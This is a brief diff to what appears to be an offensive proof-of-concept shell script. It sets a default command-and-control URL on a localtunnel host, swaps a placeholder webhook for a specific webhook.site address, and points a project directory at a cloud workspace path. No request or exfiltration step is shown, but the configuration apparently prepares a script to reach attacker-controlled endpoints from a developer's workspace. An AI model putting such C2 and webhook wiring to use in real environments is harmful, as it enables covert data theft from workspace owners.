@@ -6,7 +6,7 @@
 # =============================================================================
 
 C2_URL="${C2_URL:-https://kappexpoc7.loca.lt}"
-WEBHOOK_URL="https://webhook.site/kappex"
+WEBHOOK_URL="https://webhook.site/98041d89-1cfe-49e4-9829-85b12015a376"
 
 PROJDIR="/workspaces/default/code"
 [ ! -d "$PROJDIR" ] && PROJDIR="$(pwd)"
